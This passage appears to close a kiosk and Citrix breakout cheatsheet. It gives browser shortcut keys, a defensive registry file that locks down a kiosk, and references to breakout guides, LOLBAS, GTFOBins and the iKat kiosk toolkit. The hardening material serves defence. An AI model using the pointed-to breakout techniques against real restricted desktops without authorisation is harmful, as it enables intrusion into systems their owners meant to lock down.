| ⌘L | Open Location |
| ⌘T | Open a new tab |
| ⌘W | Close the current tab |
| ⌘R | Refresh the current tab |
| ⌘. | Stop loading the current tab |
| ⌘⌥F | Search in your mailbox |

## Hardening Reference (Defenders)

A starting-point REG file for locking down a kiosk. Note that many items depend on the shell in use, and the `Scancode Map` value can remap or disable any key:

```
Windows Registry Editor Version 5.00

; Blocks Right Click > Open (does not stop drag-and-drop)
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
"NoViewContextMenu"=dword:00000001

; Disable Task Manager via CTRL+SHIFT+ESC and CTRL+ALT+DEL
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
"DisableTaskMgr"=dword:00000001

; Disable most Windows key functions
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer]
"NoWinKeys"=dword:00000001

; Disable the Windows key fully (NoWinKeys misses some combinations)
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout]
"Scancode Map"=hex:00,00,00,00,00,00,00,00,03,00,00,00,00,00,5B,E0,00,00,5C,E0,00,00,00,00
```

Keymapper by Stuart Dunkeld ([justkeepswimming.net/keymapper](http://justkeepswimming.net/keymapper/)) helps work out the codes for `Scancode Map`. Beyond the registry, enforce WDAC/AppLocker, Citrix App Protection Policies, Edge Enterprise policies, and Assigned Access / Shell Launcher kiosk modes.

## References

- HackTricks - [Escaping from GUI Applications](https://hacktricks.wiki/en/hardware-physical-access/escaping-from-gui-applications.html)
- InternalAllTheThings - [Escape Breakout cheatsheet](https://github.com/swisskyrepo/InternalAllTheThings/blob/master/docs/cheatsheets/escape-breakout.md)
- PentestPartners - [Breaking out of Citrix and other restricted desktop environments](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/)
- [LOLBAS Project](https://lolbas-project.github.io/) and [GTFOBins](https://gtfobins.github.io/)
- iKat kiosk toolkit - [swin.es/k](http://swin.es/k/), [ikat.kronicd.net](http://www.ikat.kronicd.net/)
- "Give me a browser, I'll give you a shell" - [Medium](https://medium.com/@Rend_/give-me-a-browser-ill-give-you-a-shell-de19811defa0)
